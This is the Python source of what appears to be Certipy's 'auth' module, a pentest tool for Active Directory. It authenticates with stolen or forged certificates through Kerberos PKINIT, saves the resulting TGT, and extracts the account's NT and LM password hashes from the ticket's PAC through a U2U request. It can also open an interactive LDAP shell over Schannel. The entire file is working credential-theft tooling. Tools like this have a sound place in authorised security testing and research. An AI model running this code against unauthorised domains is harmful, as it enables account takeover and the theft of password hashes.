"""
Kerberos PKINIT and Schannel Authentication Module for Certipy.

This module provides functionality for certificate-based Kerberos authentication:
- PKINIT authentication using certificates
- NT hash extraction via Kerberos U2U
- LDAPS (Schannel) authentication using certificates
- Interactive LDAP shell

It supports various authentication workflows for penetration testing and security assessments.
"""

import argparse
import base64
import datetime
import sys
from random import getrandbits
from typing import Any, Optional, Union

from asn1crypto import cms, core
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.examples.ldap_shell import LdapShell as _LdapShell
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import (
    seq_set,
    seq_set_iter,
)
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from certipy.lib.certificate import (
    cert_id_to_parts,
    get_identities_from_certificate,
    get_object_sid_from_certificate,
    hash_digest,
    hashes,
    load_pfx,
    print_certificate_authentication_information,
    x509,
)
from certipy.lib.errors import KRB5_ERROR_MESSAGES, handle_error
from certipy.lib.files import try_to_save_file
from certipy.lib.ldap import LDAPConnection
from certipy.lib.logger import logging
from certipy.lib.pkinit import build_pkinit_as_req
from certipy.lib.structs import EncType, KDCDHKeyInfo, PaPkAsRep, e2i
from certipy.lib.target import Target


class LdapShell(_LdapShell):
    """
    Enhanced LDAP shell for interactive administration.

    This shell provides a command-line interface for interacting with LDAP
    after successfully authenticating with a certificate.
    """

    def __init__(self, tcp_shell: Any, domain_dumper: Any, client: Any):
        """
        Initialize the LDAP shell.

        Args:
            tcp_shell: Shell to use for I/O
            domain_dumper: Domain information provider
            client: LDAP client connection
        """
        super().__init__(tcp_shell, domain_dumper, client)

        self.use_rawinput = True
        self.shell = tcp_shell
        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def do_dump(self, line: str):
        """
        Placeholder for domain dumping functionality.

        Args:
            line: Command line input
        """
        logging.warning("Not implemented")

    def do_exit(self, line: str):
        """
        Exit the shell.

        Args:
            line: Command line input

        Returns:
            True to signal shell exit
        """
        print("Bye!")
        return True


class DummyDomainDumper:
    """
    Simple domain information provider for the LDAP shell.

    This class provides minimal domain information required by the LDAP shell.
    """

    def __init__(self, root: str):
        """
        Initialize with domain root.

        Args:
            root: LDAP root path (e.g., DC=contoso,DC=com)
        """
        self.root = root


def truncate_key(value: bytes, keysize: int) -> bytes:
    """
    Truncate a key to the specified size using SHA1 hashing.

    Args:
        value: Input key material
        keysize: Desired key size in bytes

    Returns:
        Truncated key of exactly keysize bytes
    """
    output = b""
    current_num = 0

    while len(output) < keysize:
        current_digest = hash_digest(bytes([current_num]) + value, hashes.SHA1)

        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break

        output += current_digest
        current_num += 1

    return output


class Authenticate:
    """
    Main authentication class for certificate-based Kerberos and LDAP authentication.

    This class provides functionality to:
    - Authenticate to Kerberos using certificates (PKINIT)
    - Extract NT hashes from Kerberos tickets
    - Connect to LDAP using certificate authentication
    - Launch interactive LDAP shells
    """

    def __init__(
        self,
        target: Target,
        pfx: Optional[str] = None,
        username: Optional[str] = None,
        domain: Optional[str] = None,
        password: Optional[str] = None,
        cert: Optional[x509.Certificate] = None,
        key: Optional[PrivateKeyTypes] = None,
        no_save: bool = False,
        no_hash: bool = False,
        print: bool = False,
        kirbi: bool = False,
        ldap_shell: bool = False,
        **kwargs,  # type: ignore
    ):
        """
        Initialize authentication parameters.

        Args:
            target: Target information (domain, DC IP, etc.)
            pfx: Path to PFX/P12 certificate file
            username: Username to authenticate as
            domain: Domain to authenticate to
            password: Password for PFX file
            cert: Pre-loaded certificate object
            key: Pre-loaded private key object
            no_save: Don't save credential cache to disk
            no_hash: Don't extract NT hash
            print: Print ticket information
            kirbi: Save credential cache in Kirbi format
            ldap_shell: Launch interactive LDAP shell after authentication
            ldap_port: LDAP port (default: 389 for ldap, 636 for ldaps)
            ldap_scheme: LDAP scheme (ldap or ldaps)
            ldap_user_dn: LDAP user distinguished name
            user_dn: User distinguished name
            **kwargs: Additional parameters
        """
        self.target = target
        self.username = username
        self.domain = domain
        self.pfx = pfx
        self.password = password
        self.cert = cert
        self.key = key
        self.no_save = no_save
        self.no_hash = no_hash
        self.print = print
        self.kirbi = kirbi
        self.ldap_shell = ldap_shell
        self.kwargs = kwargs

        # These will be populated during authentication
        self.nt_hash: Optional[str] = None
        self.lm_hash: Optional[str] = None
        self.ccache_name: Optional[str] = None

        # Load certificate and key from PFX if provided
        if self.pfx is not None:
            pfx_password = None
            if self.password:
                pfx_password = self.password.encode()

            try:
                with open(self.pfx, "rb") as f:
                    pfx_data = f.read()
                self.key, self.cert = load_pfx(pfx_data, pfx_password)
            except Exception as e:
                logging.error(f"Failed to load PFX file: {e}")
                raise

    def authenticate(
        self,
        username: Optional[str] = None,
        domain: Optional[str] = None,
        is_key_credential: bool = False,
    ) -> Union[str, bool, None]:
        """
        Authenticate using a certificate.

        This is the main entry point for authentication. It will determine
        whether to use LDAP or Kerberos authentication based on configuration.

        Args:
            username: Username to authenticate as
            domain: Domain to authenticate to
            is_key_credential: Whether we're using a key credential

        Returns:
            NT hash if extracted, True if successful, False if failed, None if error
        """
        if not self.cert:
            raise ValueError("Certificate is not specified and no PFX was provided")

        # Print authentication information present in the certificate
        print_certificate_authentication_information(self.cert)

        # Resolve username and domain from target if not provided
        if not username:
            username = self.username or self.target.username

        if not domain:
            domain = self.domain or self.target.domain

        # Use LDAP authentication if requested
        if self.ldap_shell:
            return self.ldap_authentication(domain)

        # Extract identity information from certificate if needed
        id_type = None
        identity = None
        object_sid = None
        cert_username = None
        cert_domain = None

        # Skip certificate parsing for key credentials
        if not is_key_credential:
            # Extract identity information from certificate
            identities = get_identities_from_certificate(self.cert)

            # Get the object SID from the certificate if available
            object_sid = get_object_sid_from_certificate(self.cert)

            # No identities found in the certificate
            if not identities:
                logging.warning("Could not find identity in the provided certificate")

            # Single identity found - use it directly
            elif len(identities) == 1:
                id_type, identity = identities[0]
                cert_username, cert_domain = cert_id_to_parts([(id_type, identity)])

            # Multiple identities found - handle based on input parameters
            else:
                logging.info("Found multiple identities in certificate")

                # Case 1: If username is provided, try to find a matching identity
                if username:
                    matching_ids = []
                    for idx, (id_t, id_val) in enumerate(identities):
                        u, d = cert_id_to_parts([(id_t, id_val)])
                        if u and (
                            u.lower() == username.lower()
                            or u.lower() + "$" == username.lower()
                        ):
                            matching_ids.append((idx, id_t, id_val, u, d))

                    # Found exactly one match for the username
                    if len(matching_ids) == 1:
                        idx, id_type, identity, cert_username, cert_domain = (
                            matching_ids[0]
                        )
                        logging.info(f"Using identity: {id_type}: {identity}")

                    # Found multiple matches - prompt user to select one
                    elif len(matching_ids) > 1:
                        logging.info(
                            f"Found multiple identities for username '{username}'"
                        )
                        logging.info("Please select one:")

                        for i, (idx, id_t, id_val, u, d) in enumerate(matching_ids):
                            print(f"    [{i}] {id_t}: {id_val!r} ({u}@{d})")

                        while True:
                            try:
                                choice = int(input("> "))
                                if 0 <= choice < len(matching_ids):
                                    (
                                        idx,
                                        id_type,
                                        identity,
                                        cert_username,
                                        cert_domain,
                                    ) = matching_ids[choice]
                                    break
                                logging.warning("Invalid index")
                            except ValueError:
                                logging.warning("Invalid input, enter a number")

                    # No matches found - prompt user to select from all identities
                    else:
                        logging.warning(f"No identities match username '{username}'")
                        logging.info("Please select an identity:")

                        for i, (id_t, id_val) in enumerate(identities):
                            u, d = cert_id_to_parts([(id_t, id_val)])
                            print(
                                f"    [{i}] {id_t}: {id_val!r} ({u or 'unknown'}@{d or 'unknown'})"
                            )

                        while True:
                            try:
                                idx = int(input("> "))
                                if 0 <= idx < len(identities):
                                    id_type, identity = identities[idx]
                                    cert_username, cert_domain = cert_id_to_parts(
                                        [(id_type, identity)]
                                    )
                                    break
                                logging.warning("Invalid index")
                            except ValueError:
                                logging.warning("Invalid input, enter a number")

                # Case 2: No username provided - prompt user to select an identity
                else:
                    logging.info("Please select an identity:")

                    for i, (id_t, id_val) in enumerate(identities):
                        u, d = cert_id_to_parts([(id_t, id_val)])
                        print(
                            f"    [{i}] {id_t}: {id_val!r} ({u or 'unknown'}@{d or 'unknown'})"
                        )

                    while True:
                        try:
                            idx = int(input("> "))
                            if 0 <= idx < len(identities):
                                id_type, identity = identities[idx]
                                cert_username, cert_domain = cert_id_to_parts(
                                    [(id_type, identity)]
                                )
                                break
                            logging.warning("Invalid index")
                        except ValueError:
                            logging.warning("Invalid input, enter a number")

        # Resolve username and domain
        if not username:
            username = cert_username

        if not domain:
            domain = cert_domain

        # Check for mismatches between certificate and provided identity
        if (
            self._check_identity_mismatches(
                username, domain, cert_username, cert_domain
            )
            is False
        ):
            return False

        # Ensure we have both username and domain
        if not all([username, domain]) and not is_key_credential:
            logging.error(
                "Username or domain is not specified, and identity "
                "information was not found in the certificate"
            )
            return False

        if not username or not domain:
            logging.error(f"Username or domain is invalid: {username}@{domain}")
            return False

        # Normalize domain and username
        domain = domain.lower()
        username = username.lower()
        upn = f"{username}@{domain}"

        # Resolve target IP if needed
        if self.target and self.target.resolver and self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info(f"Using principal: {upn!r}")

        # Perform Kerberos authentication
        return self.kerberos_authentication(
            username,
            domain,
            is_key_credential,
            id_type,
            identity,
            object_sid,
            upn,
        )

    def _check_identity_mismatches(
        self,
        username: Optional[str],
        domain: Optional[str],
        cert_username: Optional[str],
        cert_domain: Optional[str],
    ) -> Optional[bool]:
        """
        Check for mismatches between provided identity and certificate identity.

        Args:
            username: Provided username
            domain: Provided domain
            cert_username: Username from certificate
            cert_domain: Domain from certificate

        Returns:
            None if checks passed, False if should abort
        """
        # Check username mismatch (accounting for computer accounts with $)
        if (
            cert_username
            and username
            and cert_username.lower() != username.lower()
            and cert_username.lower() + "$" != username.lower()
        ):
            logging.warning(
                f"The provided username does not match the identity "
                f"found in the certificate: {username!r} - {cert_username!r}"
            )
            res = input("Do you want to continue? (Y/n): ")
            if res.strip().lower() == "n":
                return False

        # Check domain mismatch (accounting for subdomains)
        if (
            cert_domain
            and domain
            and domain.lower() != cert_domain.lower()
            and not cert_domain.lower().startswith(domain.lower().rstrip(".") + ".")
        ):
            logging.warning(
                f"The provided domain does not match the identity "
                f"found in the certificate: {domain!r} - {cert_domain!r}"
            )
            res = input("Do you want to continue? (Y/n): ")
            if res.strip().lower() == "n":
                return False

        return None

    def ldap_authentication(self, domain: Optional[str] = None) -> bool:
        """
        Authenticate to LDAP using a certificate.

        Args:
            domain: Domain to authenticate to

        Returns:
            True if successful, False otherwise
        """
        if self.key is None:
            raise ValueError("Private key is not specified and no PFX was provided")
        if self.cert is None:
            raise ValueError("Certificate is not specified and no PFX was provided")

        ldap_conn = LDAPConnection(self.target, (self.cert, self.key))

        try:
            ldap_conn.schannel_connect()
        except Exception as e:
            logging.error(f"Failed to connect to LDAP server: {e}")
            handle_error()
            return False

        if ldap_conn.default_path is None:
            logging.error("Failed to retrieve default naming context")
            return False

        domain_dumper = DummyDomainDumper(ldap_conn.default_path)
        ldap_shell = LdapShell(sys, domain_dumper, ldap_conn.ldap_conn)

        try:
            ldap_shell.cmdloop()
        except KeyboardInterrupt:
            print("Bye!\n")

        return True

    def kerberos_authentication(
        self,
        username: str,
        domain: str,
        is_key_credential: bool = False,
        id_type: Optional[str] = None,
        identity: Optional[str] = None,
        object_sid: Optional[str] = None,
        upn: Optional[str] = None,
    ) -> Union[str, bool, None]:
        """
        Authenticate to Kerberos using PKINIT with a certificate.

        Args:
            username: Username to authenticate as
            domain: Domain to authenticate to
            is_key_credential: Whether we're using a key credential
            id_type: Type of identity in certificate
            identity: identity value from certificate
            object_sid: SID from certificate
            upn: User Principal Name

        Returns:
            NT hash if extracted, True if successful, False otherwise
        """
        if self.key is None:
            raise ValueError("Private key is not specified and no PFX was provided")

        if self.cert is None:
            raise ValueError("Certificate is not specified and no PFX was provided")

        if not isinstance(self.key, rsa.RSAPrivateKey):
            raise ValueError(
                "Currently only RSA private keys are supported. Try using -ldap-shell instead"
            )

        # Create AS-REQ for PKINIT
        as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)

        # Resolve target IP if needed
        if self.target and self.target.resolver and self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info("Trying to get TGT...")
        logging.debug(f"Sending AS-REQ to KDC {domain} ({self.target.target_ip})")

        try:
            # Send Kerberos AS-REQ
            tgt = sendReceive(as_req, domain, self.target.target_ip)
        except KerberosError as e:
            # Handle Kerberos errors with helpful messages
            if e.getErrorCode() not in KRB5_ERROR_MESSAGES:
                logging.error(f"Got unknown Kerberos error: {e.getErrorCode():#x}")
                return False

            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    f"Name mismatch between certificate and user {username!r}"
                )
                if id_type is not None:
                    logging.error(
                        f"Verify that the username {username!r} matches the certificate {id_type}: {identity}"
                    )
            elif "KDC_ERR_WRONG_REALM" in str(e) and not is_key_credential:
                logging.error(f"Wrong domain name specified {domain!r}")
                if id_type is not None:
                    logging.error(
                        f"Verify that the domain {domain!r} matches the certificate {id_type}: {identity}"
                    )
            elif "KDC_ERR_CERTIFICATE_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    f"Object SID mismatch between certificate and user {username!r}"
                )
                if object_sid is not None:
                    logging.error(
                        f"Verify that user {username!r} has object SID {object_sid!r}"
                    )

            elif "KDC_ERR_INCONSISTENT_KEY_PURPOSE" in str(e):
                logging.error("Certificate is not valid for client authentication")
                logging.error(
                    "Check the certificate template and ensure it has the correct EKU(s)"
                )
                logging.error(
                    "If you recently changed the certificate template, wait a few minutes for the change to propagate"
                )
            else:
                logging.error(f"Got error while trying to request TGT: {e}")
                handle_error()

            logging.error("See the wiki for more information")

            return False

        logging.info("Got TGT")

        # Process AS-REP
        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        # Extract PA-PK-AS-REP
        for pa in as_rep["padata"]:
            if pa["padata-type"] == 17:  # PA-PK-AS-REP
                pk_as_rep = PaPkAsRep.load(bytes(pa["padata-value"])).native
                break
        else:
            logging.error("PA_PK_AS_REP was not found in AS_REP")
            return False

        # Process Diffie-Hellman key exchange data
        ci = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        sd = ci["content"]
        key_info = sd["encap_content_info"]

        if key_info["content_type"] != "1.3.6.1.5.2.3.2":
            logging.error("Unexpected value for key info content type")
            return False

        # Get public key from KDC
        auth_data = KDCDHKeyInfo.load(key_info["content"]).native
        pub_key = int.from_bytes(
            core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big",
            signed=False,
        )

        # Complete Diffie-Hellman exchange
        shared_key = diffie.exchange(pub_key)
        server_nonce = pk_as_rep["serverDHNonce"]
        full_key = shared_key + diffie.dh_nonce + server_nonce

        # Derive encryption key
        etype = as_rep["enc-part"]["etype"]
        cipher = _enctype_table[etype]

        if etype == EncType.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == EncType.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            logging.error("Unexpected encryption type in AS_REP")
            return False

        # Decrypt AS-REP
        key = Key(cipher.enctype, t_key)
        enc_data = as_rep["enc-part"]["cipher"]
        dec_data = cipher.decrypt(key, 3, enc_data)
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]

        # Extract session key
        cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
        session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))

        # Create credential cache
        ccache = CCache()
        ccache.fromTGT(tgt, key, None)
        krb_cred = ccache.toKRBCRED()

        # Print ticket if requested
        if self.print:
            logging.info("Ticket:")
            print(base64.b64encode(krb_cred).decode())

        # Save ticket to file if requested
        if not self.no_save:
            if self.kirbi:
                kirbi_name = f"{username.rstrip('$')}.kirbi"
                logging.info(f"Saving Kirbi file to {kirbi_name!r}")
                saved_path = try_to_save_file(ccache.toKRBCRED(), kirbi_name)
                logging.info(f"Wrote Kirbi file to {saved_path!r}")
            else:
                self.ccache_name = f"{username.rstrip('$')}.ccache"
                logging.info(f"Saving credential cache to {self.ccache_name!r}")
                saved_path = try_to_save_file(ccache.getData(), self.ccache_name)
                logging.info(f"Wrote credential cache to {saved_path!r}")

        # Extract NT hash if requested
        if not self.no_hash:
            logging.info(f"Trying to retrieve NT hash for {username!r}")

            try:
                # Create AP-REQ for User-to-User (U2U) authentication
                ap_req = AP_REQ()
                ap_req["pvno"] = 5
                ap_req["msg-type"] = e2i(constants.ApplicationTagNumbers.AP_REQ)
                ap_req["ap-options"] = constants.encodeFlags([])

                # Use received ticket
                ticket = Ticket()
                ticket = ticket.from_asn1(as_rep["ticket"])
                seq_set(ap_req, "ticket", ticket.to_asn1)

                # Create authenticator for AP-REQ
                authenticator = Authenticator()
                authenticator["authenticator-vno"] = 5
                authenticator["crealm"] = bytes(as_rep["crealm"])

                client_name = Principal()
                client_name = client_name.from_asn1(as_rep, "crealm", "cname")
                seq_set(authenticator, "cname", client_name.components_to_asn1)

                # Set time in authenticator
                now = datetime.datetime.now(datetime.timezone.utc)
                authenticator["cusec"] = now.microsecond
                authenticator["ctime"] = KerberosTime.to_asn1(now)

                # Encrypt authenticator with session key
                encoded_authenticator = encoder.encode(authenticator)
                encrypted_encoded_authenticator = cipher.encrypt(
                    session_key, 7, encoded_authenticator, None
                )

                ap_req["authenticator"] = noValue
                ap_req["authenticator"]["etype"] = cipher.enctype
                ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

                encoded_ap_req = encoder.encode(ap_req)

                # Create TGS-REQ with U2U flag
                tgs_req = TGS_REQ()
                tgs_req["pvno"] = 5
                tgs_req["msg-type"] = e2i(constants.ApplicationTagNumbers.TGS_REQ)

                # Add AP-REQ as PA data
                tgs_req["padata"] = noValue
                tgs_req["padata"][0] = noValue
                tgs_req["padata"][0]["padata-type"] = e2i(
                    constants.PreAuthenticationDataTypes.PA_TGS_REQ
                )

                tgs_req["padata"][0]["padata-value"] = encoded_ap_req

                req_body = seq_set(tgs_req, "req-body")

                # Set KDC options for U2U
                opts = [
                    e2i(constants.KDCOptions.forwardable),
                    e2i(constants.KDCOptions.renewable),
                    e2i(constants.KDCOptions.canonicalize),
                    e2i(constants.KDCOptions.enc_tkt_in_skey),  # This enables U2U
                    e2i(constants.KDCOptions.forwardable),
                    e2i(constants.KDCOptions.renewable_ok),
                ]
                req_body["kdc-options"] = constants.encodeFlags(opts)

                # Request a ticket to self (U2U)
                server_name = Principal(
                    username, type=e2i(constants.PrincipalNameType.NT_UNKNOWN)
                )
                seq_set(req_body, "sname", server_name.components_to_asn1)
                req_body["realm"] = str(as_rep["crealm"])

                # Set validity period
                now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(
                    days=1
                )
                req_body["till"] = KerberosTime.to_asn1(now)
                req_body["nonce"] = getrandbits(31)

                # Request supported encryption types
                seq_set_iter(
                    req_body,
                    "etype",
                    (int(cipher.enctype), e2i(constants.EncryptionTypes.rc4_hmac)),
                )

                # Include our own ticket
                ticket_asn1 = ticket.to_asn1(TicketAsn1())
                seq_set_iter(req_body, "additional-tickets", (ticket_asn1,))

                # Send TGS-REQ
                message = encoder.encode(tgs_req)
                tgs = sendReceive(message, domain, self.target.target_ip)
                tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

                # Decrypt ticket from TGS-REP
                ciphertext = tgs["ticket"]["enc-part"]["cipher"]
                new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]
                plaintext = new_cipher.decrypt(session_key, 2, ciphertext)

                # Create special key using the t_key
                special_key = Key(18, t_key)

                # Extract PAC from ticket
                data = plaintext
                enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
                ad_if_relevant = decoder.decode(
                    enc_ticket_part["authorization-data"][0]["ad-data"],
                    asn1Spec=AD_IF_RELEVANT(),
                )[0]
                pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
                buff = pac_type["Buffers"]

                # Default hash values
                nt_hash = None
                lm_hash = "aad3b435b51404eeaad3b435b51404ee"

                # Look for credential info in PAC
                for _ in range(pac_type["cBuffers"]):
                    info_buffer = PAC_INFO_BUFFER(buff)
                    data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
                        : info_buffer["cbBufferSize"]
                    ]

                    # PAC_CREDENTIAL_INFO contains the hashes
                    if info_buffer["ulType"] == 2:  # PAC_CREDENTIAL_INFO
                        cred_info = PAC_CREDENTIAL_INFO(data)
                        new_cipher = _enctype_table[cred_info["EncryptionType"]]

                        # Decrypt the credentials with the special key
                        out = new_cipher.decrypt(
                            special_key, 16, cred_info["SerializedData"]
                        )

                        # Parse credential data
                        type1 = TypeSerialization1(out)
                        new_data = out[len(type1) + 4 :]
                        pcc = PAC_CREDENTIAL_DATA(new_data)

                        # Extract NTLM hashes
                        for cred in pcc["Credentials"]:
                            cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                                b"".join(cred["Credentials"])
                            )
                            if any(cred_structs["LmPassword"]):
                                lm_hash = cred_structs["LmPassword"].hex()
                            nt_hash = cred_structs["NtPassword"].hex()
                            break
                        break

                    # Move to next buffer
                    buff = buff[len(info_buffer) :]
                else:
                    logging.error("Could not find credentials in PAC")
                    return False

                # Store hashes in object
                self.lm_hash = lm_hash
                self.nt_hash = nt_hash

                # Display hash information
                if not is_key_credential:
                    logging.info(f"Got hash for {upn!r}: {lm_hash}:{nt_hash}")

                # Return the NT hash
                return nt_hash

            except Exception as e:
                logging.error(f"Failed to extract NT hash: {e}")
                handle_error()
                return False

        # Authentication succeeded
        return True


def entry(options: argparse.Namespace) -> None:
    """
    Entry point for the 'auth' command.

    Args:
        options: Command-line arguments
    """
    # Ensure we don't try to use password authentication
    options.no_pass = True

    # Create target from options
    target = Target.from_options(options, dc_as_target=True, require_username=False)

    # Create authenticator and perform authentication
    try:
        authenticate = Authenticate(target=target, **vars(options))
        result = authenticate.authenticate()

        if result is False:
            sys.exit(1)
    except Exception as e:
        logging.error(f"Authentication failed: {e}")
        handle_error()
        sys.exit(1)
